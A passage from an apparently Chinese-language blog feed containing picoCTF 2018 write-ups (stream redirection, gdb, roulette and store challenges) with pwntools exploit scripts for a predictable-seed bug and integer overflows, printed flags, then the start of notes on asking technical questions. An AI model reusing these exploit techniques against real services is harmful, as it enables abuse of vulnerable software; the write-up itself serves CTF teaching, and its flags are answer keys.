/problems/absolutely-relative_4_bef88c36784b44d2585bb4d2dbe074bd/absolutely-relative ~/</code>,再运行就可以得到flag了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mads@pico-2018-shell-2:~$ ./absolutely-relative </span><br><span class="line">You have the write permissions.</span><br><span class="line">picoCTF&#123;3v3r1ng_1<span class="variable">$_r3l3t1v3_3b69633f</span>&#125;</span><br></pre></td></tr></table></figure></p><h1 id="in-out-error-275pts"><a href="#in-out-error-275pts" class="headerlink" title="in out error (275pts)"></a>in out error (275pts)</h1><h2 id="题目-15"><a href="#题目-15" class="headerlink" title="题目"></a>题目</h2><p>Can you utlize stdin, stdout, and stderr to get the flag from this <a href="https://2018shell2.picoctf.com/static/2ecf92ada9cb40149cb4a2154441f678/in-out-error" target="_blank" rel="noopener">program [1]</a> ? You can also find it in /problems/in-out-error_3_9eb10797d687f70cfce62e7c9c2bdea6 on the shell server</p><blockquote><p>Hints:<br>(1) Maybe you can split the stdout and stderr output?</p></blockquote><h2 id="题解-15"><a href="#题解-15" class="headerlink" title="题解"></a>题解</h2><p>本题考查linux的标准输出、标准错误流, 我们可以利用<code>&gt;</code>将两种流重定向到其他地方, 从而分离流的内容, 得到flag.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'Please may I have the flag?'</span>|./<span class="keyword">in</span>-out-error 1&gt;/dev/null</span><br></pre></td></tr></table></figure></p><p>发现打印出很多一样的flag</p><h1 id="learn-gdb-300pts"><a href="#learn-gdb-300pts" class="headerlink" title="learn gdb (300pts)"></a>learn gdb (300pts)</h1><h2 id="题目-16"><a href="#题目-16" class="headerlink" title="题目"></a>题目</h2><p>Using a debugging tool will be extremely useful on your missions. Can you run this <a href="https://2018shell2.picoctf.com/static/58c2e42eecc19e464af2c0dac8da7a77/run" target="_blank" rel="noopener">program [1]</a>  in gdb and find the flag? You can find the file in /problems/learn-gdb_0_716957192e537ac769f0975c74b34194 on the shell server.</p><blockquote><p>Hints:<br>(1) Try setting breakpoints in gdb (2) Try and find a point in the program after the flag has been read into memory to break on (3) Where is the flag being written in memory?</p></blockquote><h2 id="题解-16"><a href="#题解-16" class="headerlink" title="题解"></a>题解</h2><p>主要考察gdb的基本使用. 我们先用gdb打开程序, <code>disassemble main</code>查看<code>main</code>函数的汇编代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb -q run</span></span><br><span class="line">gef➤  disassemble main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x00000000004008c9 &lt;+0&gt;:push   rbp</span><br><span class="line">   0x00000000004008ca &lt;+1&gt;:mov    rbp,rsp</span><br><span class="line">   0x00000000004008cd &lt;+4&gt;:sub    rsp,0x10</span><br><span class="line">   0x00000000004008d1 &lt;+8&gt;:mov    DWORD PTR [rbp-0x4],edi</span><br><span class="line">   0x00000000004008d4 &lt;+11&gt;:mov    QWORD PTR [rbp-0x10],rsi</span><br><span class="line">   0x00000000004008d8 &lt;+15&gt;:mov    rax,QWORD PTR [rip+0x200af9]        <span class="comment"># 0x6013d8 &lt;stdout@@GLIBC_2.2.5&gt;</span></span><br><span class="line">   0x00000000004008df &lt;+22&gt;:mov    ecx,0x0</span><br><span class="line">   0x00000000004008e4 &lt;+27&gt;:mov    edx,0x2</span><br><span class="line">   0x00000000004008e9 &lt;+32&gt;:mov    esi,0x0</span><br><span class="line">   0x00000000004008ee &lt;+37&gt;:mov    rdi,rax</span><br><span class="line">   0x00000000004008f1 &lt;+40&gt;:call   0x400650 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x00000000004008f6 &lt;+45&gt;:mov    edi,0x4009d0</span><br><span class="line">   0x00000000004008fb &lt;+50&gt;:call   0x400600 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400900 &lt;+55&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400905 &lt;+60&gt;:call   0x400786 &lt;decrypt_flag&gt;</span><br><span class="line">   0x000000000040090a &lt;+65&gt;:mov    edi,0x400a08</span><br><span class="line">   0x000000000040090f &lt;+70&gt;:call   0x400600 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400914 &lt;+75&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400919 &lt;+80&gt;:leave  </span><br><span class="line">   0x000000000040091a &lt;+81&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p><p>容易发现解密flag的函数是在<code>0x0000000000400905</code>, 我们可以在下一条指令下一个断点<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x000000000040090a</span><br><span class="line">Breakpoint 1 at 0x40090a</span><br></pre></td></tr></table></figure></p><p>跑起来, 在断点出断下来之后, 根据题目打印信息提示获取<code>flag_buf</code>全局变量的值即可.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x (char *)flag_buf</span><br><span class="line">0x602260:<span class="string">"picoCTF&#123;gDb_iS_sUp3r_u53fuL_a6c61d82&#125;"</span></span><br></pre></td></tr></table></figure></p><h1 id="roulette-350pts"><a href="#roulette-350pts" class="headerlink" title="roulette (350pts)"></a>roulette (350pts)</h1><h2 id="题目-17"><a href="#题目-17" class="headerlink" title="题目"></a>题目</h2><p>This Online <a href="https://2018shell2.picoctf.com/static/191a3b6cb7dd34093f5d660ffa07b570/roulette" target="_blank" rel="noopener">Roulette [1]</a>  Service is in Beta. Can you find a way to win $1,000,000,000 and get the flag? <a href="https://2018shell2.picoctf.com/static/191a3b6cb7dd34093f5d660ffa07b570/roulette.c" target="_blank" rel="noopener">Source [2]</a> . Connect with nc <code>2018shell2.picoctf.com 25443</code></p><blockquote><p>Hints:<br>(1) There are 2 bugs!</p></blockquote><h2 id="题解-17"><a href="#题解-17" class="headerlink" title="题解"></a>题解</h2><p>题目是一个模拟赌场小程序, 提示有两个bug, 经过审计源代码可以发现两个bug分别是:</p><ol><li>伪随机问题<br>在<code>main</code>函数发现我们的初始<code>cash</code>是通过<code>get_rand</code>函数获得的, 看一下<code>get_rand</code><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_rand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> seed;</span><br><span class="line">  FILE *f = fopen(<span class="string">"/dev/urandom"</span>, <span class="string">"r"</span>);</span><br><span class="line">  fread(&amp;seed, <span class="keyword">sizeof</span>(seed), <span class="number">1</span>, f);</span><br><span class="line">  fclose(f);</span><br><span class="line">  seed = seed % <span class="number">5000</span>;</span><br><span class="line">  <span class="keyword">if</span> (seed &lt; <span class="number">0</span>) seed = seed * <span class="number">-1</span>;</span><br><span class="line">  srand(seed); <span class="comment">// bug1</span></span><br><span class="line">  <span class="keyword">return</span> seed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>发现在获取到一个随机数之后, 直接作为随机数种子, 并且返回. 也就是说我们得到的初始<code>cash</code>就是伪随机发生器的种子, 这意味着我们可以知道每次要猜的值是多少.这里也给出随机数生成代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">2.</span> 逻辑漏洞+长整型溢出</span><br><span class="line">程序中的`get_long`函数用户获取用户输入的一个`<span class="keyword">long</span>`数字, 并且判断有没有溢出, 看下源码:</span><br><span class="line">```c</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_long</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> l = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!is_digit(c))</span><br><span class="line">      c = getchar();</span><br><span class="line">    <span class="keyword">while</span>(is_digit(c)) &#123;</span><br><span class="line">        <span class="comment">// bug2</span></span><br><span class="line">      <span class="keyword">if</span>(l &gt;= LONG_MAX) &#123;</span><br><span class="line">l = LONG_MAX;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      l *= <span class="number">10</span>;</span><br><span class="line">      l += c - <span class="string">'0'</span>;</span><br><span class="line">      c = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(c != <span class="string">'\n'</span>)</span><br><span class="line">      c = getchar();</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>乍一看好像没问题, 我们貌似没法溢出. 但仔细手模一下会发现, 判断溢出的代码写在<code>while</code>语句开头的地方, 也就是说, 我们输入的数字s, 只要s[:-1]转换成long没有溢出, 但是整个串还是可以溢出！因为溢出我们输入的是回车字符, 就可以直接跳出循环.</p><p>根据程序思路, 有两个要求要满足, 要<code>cash &gt; ONE_BILLION</code> 和 <code>wins &gt; HOTSRWAK(3)</code>才能拿到flag.<br>于是整体思路整理如下:</p><ol><li>利用伪随机赢下三次</li><li>利用长整型溢出漏洞拿到flag</li></ol><p>exp如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re,subprocess</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'2018shell2.picoctf.com'</span>, <span class="number">25443</span>)</span><br><span class="line">m1 = sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">balance = re.findall(<span class="string">'\$(\d&#123;1,4&#125;)'</span>, m1)[<span class="number">0</span>]</span><br><span class="line">rand = subprocess.check_output([<span class="string">'./rand'</span>, balance]).split(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'round 1...'</span></span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">sh.sendline(rand[<span class="number">0</span>])</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'round 2...'</span></span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">sh.sendline(rand[<span class="number">2</span>])</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'round 3...'</span></span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">sh.sendline(rand[<span class="number">4</span>])</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'getting flag...'</span></span><br><span class="line">sh.sendline(<span class="string">'3294967296'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">sh.sendline(str(int(rand[<span class="number">6</span>])+<span class="number">1</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'flag!\n'</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recv()</span><br><span class="line"><span class="comment"># picoCTF&#123;1_h0p3_y0u_f0uNd_b0tH_bUg5_8b7aef91&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="Store-400pts"><a href="#Store-400pts" class="headerlink" title="Store (400pts)"></a>Store (400pts)</h1><h2 id="题目-18"><a href="#题目-18" class="headerlink" title="题目"></a>题目</h2><p>We started a little <a href="https://2018shell2.picoctf.com/static/5f775969757dd025afe50827eb9db223/store" target="_blank" rel="noopener">store [1]</a> , can you buy the flag? <a href="https://2018shell2.picoctf.com/static/5f775969757dd025afe50827eb9db223/source.c" target="_blank" rel="noopener">Source [2]</a> . Connect with 2018shell2.picoctf.com 53220.</p><blockquote><p>Hints:<br>(1) Two’s compliment can do some weird things when numbers get really big!</p></blockquote><h2 id="题解-18"><a href="#题解-18" class="headerlink" title="题解"></a>题解</h2><p>题目提示补码, 顺着题意, 题目大概就是一个模拟商店, 卖两种商品, 一个是仿制的flag, 一个1000. 一个是真flag, 需要100000. 初始金钱只有1100. 程序中有加减乘除的地方就是买假flag的地方:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(auction_choice == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Imitation Flags cost 1000 each, how many would you like?\n"</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">int</span> number_flags = <span class="number">0</span>;</span><br><span class="line">                fflush(<span class="built_in">stdin</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;number_flags);</span><br><span class="line">                <span class="keyword">if</span>(number_flags &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">int</span> total_cost = <span class="number">0</span>;</span><br><span class="line">                    total_cost = <span class="number">1000</span>*number_flags; <span class="comment">// 这里</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\nYour total cost is: %d\n"</span>, total_cost);</span><br><span class="line">                    <span class="keyword">if</span>(total_cost &lt;= account_balance)&#123;</span><br><span class="line">                        account_balance = account_balance - total_cost;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"\nYour new balance: %d\n\n"</span>, account_balance);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"Not enough funds\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>程序中变量都是<code>int</code>型, 也就是有符号整数型, 在购买假flag时, <code>number_flags</code>变量乘上了1000, 这里就可能存在结果超越了有符号整数型的最大正数<code>2147483647</code>, 从而变成一个负数, 然后后面的语句<code>account_balance = account_balance - total_cost;</code>就会导致<code>account_balance</code>在购买了假flag之后反而变多了. 根据题意需要<code>100000</code>购买真flag, 我们做一下数学题.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">account_balance - (input * 1000 - 2^32) &gt; 100000</span><br></pre></td></tr></table></figure></p><p>我们算出一个值, <code>4294868</code>输入给<code>number_flags</code>即可获得flag. exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"error"</span></span><br><span class="line">sh = remote(<span class="string">"2018shell2.picoctf.com"</span>,<span class="number">53220</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'4294868'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">msg = sh.recv()</span><br><span class="line">flag = re.findall(<span class="string">"(picoCTF&#123;.*&#125;)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> flag <span class="comment"># picoCTF&#123;numb3r3_4r3nt_s4f3_cbb7151f&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="script-me-500pts"><a href="#script-me-500pts" class="headerlink" title="script me (500pts)"></a>script me (500pts)</h1><h2 id="题目-19"><a href="#题目-19" class="headerlink" title="题目"></a>题目</h2><p>Can you understand the language and answer the questions to retrieve the flag? Connect to the service with nc 2018shell2.picoctf.com 8672</p><blockquote><p>Hints:<br>(1) Maybe try writing a python script?</p></blockquote><h2 id="题解-19"><a href="#题解-19" class="headerlink" title="题解"></a>题解</h2><p>这道题很有意思, 根据给出的一些计算规则, 计算复杂的组合式.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">() + () = ()()                                      =&gt; [combine]</span><br><span class="line">((())) + () = ((())())                              =&gt; [absorb-right]</span><br><span class="line">() + ((())) = (()(()))                              =&gt; [absorb-left]</span><br><span class="line">(())(()) + () = (())(()())                          =&gt; [combined-absorb-right]</span><br><span class="line">() + (())(()) = (()())(())                          =&gt; [combined-absorb-left]</span><br><span class="line">(())(()) + ((())) = ((())(())(()))                  =&gt; [absorb-combined-right]</span><br><span class="line">((())) + (())(()) = ((())(())(()))                  =&gt; [absorb-combined-left]</span><br><span class="line">() + (()) + ((())) = (()()) + ((())) = ((()())(())) =&gt; [left-associative]</span><br></pre></td></tr></table></figure></p><p>仔细观察题目可以发现, 这些计算规则无非就是结合与左右吸收, 结合就是简单连接, 左右吸收都是简单的吸收到第一个半括号内. 我们需要寻找的就是什么时候做这些操作. 也就是说, 他是根据什么来判断是该结合还是该左吸收还是右吸收. 我这里发现一个规律(当然可能并不是唯一解): 判断的原则是表达式中的括号的最大深度. 比如<code>()</code>深度是1, <code>(())</code>深度是2, <code>(())(())</code>深度也是2. 于是拿到一个简单的二元表达式, 计算思路是:</p><ol><li>计算两个元素s1, s2的最大深度w1, w2.</li><li>如果w1==w2相等, 则直接<code>combine</code>, return s1+s2; </li><li>如果w1&gt;w2, 则 return s1[:-1] + s2 + s1[-1];</li><li>如果w1&lt;w2, 则 return s1[1] + s2 + s1[1:];</li></ol><p>于是拿到一串要计算的表达式, 整体思路就是:</p><ol><li>获取各个表达式元素</li><li>根据<code>left-associative</code>原则, 从左往右两两计算</li></ol><p>exp如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys,re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_weight</span><span class="params">(s)</span>:</span></span><br><span class="line">    w = <span class="number">1</span></span><br><span class="line">    wm = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">'('</span>:</span><br><span class="line">            w+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            w-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> w&gt;wm:</span><br><span class="line">            wm = w</span><br><span class="line">    <span class="keyword">return</span> wm</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(e1,e2)</span>:</span></span><br><span class="line">    w1 = get_weight(e1)</span><br><span class="line">    w2 = get_weight(e2)</span><br><span class="line">    <span class="keyword">if</span> w1 == w2:</span><br><span class="line">        <span class="keyword">return</span> e1+e2</span><br><span class="line">    <span class="keyword">elif</span> w1&gt;w2:</span><br><span class="line">        <span class="keyword">return</span> e1[:<span class="number">-1</span>] + e2 + e1[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> e2[<span class="number">0</span>] + e1 + e2[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(ea)</span>:</span></span><br><span class="line">    r = ea[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(ea)):</span><br><span class="line">        r = add(r, ea[i])</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'connecting...'</span></span><br><span class="line">sh = remote(<span class="string">'2018shell2.picoctf.com'</span>, <span class="number">8672</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'.\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'round 1...'</span></span><br><span class="line">e = sh.recvline().split(<span class="string">' = '</span>)[<span class="number">0</span>]</span><br><span class="line">a = calc(e.split(<span class="string">' + '</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">sh.sendline(a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'round '</span>+ str(i+<span class="number">2</span>) +<span class="string">'...'</span></span><br><span class="line">    e = re.findall(<span class="string">'(\([() +]+\))'</span>, sh.recvuntil(<span class="string">'&gt; '</span>))[<span class="number">0</span>]</span><br><span class="line">    a = calc(e.split(<span class="string">' + '</span>))</span><br><span class="line">    sh.sendline(a)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'receiving flag...'</span></span><br><span class="line">sh.recvuntil(<span class="string">'flag'</span>)</span><br><span class="line">flag = re.findall(<span class="string">'(picoCTF&#123;.*&#125;)'</span>, sh.recv())[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> flag <span class="comment"># picoCTF&#123;5cr1pt1nG_l1k3_4_pRo_0970eb2d&#125;</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;首发于&lt;a href=&quot;https://xz.aliyun.com/t/2926&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;先知社区&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;picoCTF的题目分布由易到难，很适合新手入门，做题过程中可以学到东西。对于
      
    
    </summary>
    
    
      <category term="MISC" scheme="http://lxzmads.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>How To Ask Questions The Smart Way Notes</title>
    <link href="http://lxzmads.github.io/2018/09/09/How%20To%20Ask%20Questions%20The%20Smart%20Way%20Note/"/>
    <id>http://lxzmads.github.io/2018/09/09/How To Ask Questions The Smart Way Note/</id>
    <published>2018-09-08T16:00:00.000Z</published>
    <updated>2019-02-17T08:05:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>感觉这本小书，就像是一本针对问问题的简化版的《人性的弱点》，书中体现了很多换位思考的思维方式——想从别人那里得到答案，应该站在解答者的角度来构造问题，而不是从提问者角度。我感觉读一读，不仅能学到如何提问题，更能学到一种比较好的解决问题的方式。</p><p>简单的将文中的句子做个摘抄，供以后温习。<a href="http://www.catb.org/~esr/faqs/smart-questions.html" target="_blank" rel="noopener">原文</a></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><ul><li>The best way to get a rapid and responsive answer is to ask it like a person with smarts, confidence, and clues who just happens to need help on one particular problem.</li></ul><h1 id="Before-You-Ask"><a href="#Before-You-Ask" class="headerlink" title="Before You Ask"></a>Before You Ask</h1><ul><li>Before asking a technical question by e-mail, or in a newsgroup, or on a website chat board, do the following:<ul><li>Try to find an answer by searching the archives of the forum or mailing list you plan to post to.</li><li>Try to find an answer by searching the Web.</li><li>Try to find an answer by reading the manual.</li><li>Try to find an answer by reading a FAQ.</li><li>Try to find an answer by inspection or experimentation.</li><li>Try to find an answer by asking a skilled friend.</li><li>If you’re a programmer, try to find an answer by reading the source code.</li></ul></li><li>saying “I googled on the following phrase but didn’t get anything that looked promising” is a good thing to do in e-mail or news postings requesting help</li><li>Hasty-sounding questions get hasty answers, or none at all.</li><li>想从别人那里得到答案，与其千方百计让别人愿意回答，还不如花点心思让问题本身有趣，让别人喜欢回答。</li><li>想得到答案，要表现出自己的诚意，表示自己非常想解决问题的决心，并且会全程提供别人需要的信息。</li></ul><h1 id="When-You-Ask"><a href="#When-You-Ask" class="headerlink" title="When You Ask"></a>When You Ask</h1><h2 id="Choose-your-forum-carefully"><a href="#Choose-your-forum-carefully" class="headerlink" title="Choose your forum carefully"></a>Choose your forum carefully</h2><ul><li>DON’T<ul><li>post your question to a forum where it’s off topic</li><li>post a very elementary question to a forum where advanced technical questions are expected, or vice-versa</li><li>cross-post to too many different newsgroups</li><li>post a personal e-mail to somebody who is neither an acquaintance of yours nor personally responsible for solving your problem</li></ul></li><li>One of the classic mistakes is asking questions about the Unix or Windows programming interface in a forum devoted to a language or library or tool portable across both.：）</li><li>可以先Google找到一些相关的论坛，群组以及Mailing List。</li></ul><h2 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h2><ul><li>Stack Exchange has grown to over 100 sites, but here are the most likely candidates:<ul><li>Super User is for questions about general-purpose computing. If your question isn’t about code or programs that you talk to only over a network connection, it probably goes here.</li><li>Stack Overflow is for questions about programming.</li><li>Server Fault is for questions about server and network administration.</li></ul></li><li>Several projects have their own specific sites, including Android, Ubuntu, TeX/LaTeX, and SharePoint. Check the Stack Exchange site for an up-to-date list.</li></ul><h2 id="Web-and-IRC-forums"><a href="#Web-and-IRC-forums" class="headerlink" title="Web and IRC forums"></a>Web and IRC 